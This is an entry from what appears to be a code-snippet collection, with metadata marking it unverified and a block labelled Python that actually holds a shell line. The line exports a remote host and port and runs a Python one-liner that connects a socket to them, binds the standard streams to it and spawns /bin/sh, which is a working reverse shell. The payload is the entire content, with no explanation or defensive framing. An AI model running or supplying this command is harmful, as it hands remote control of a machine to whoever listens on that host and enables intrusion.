---
id: 71fca108-9749-4188-9c44-2c3873debe83
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.245744+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet 71fca108

**Language**: Python

```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```


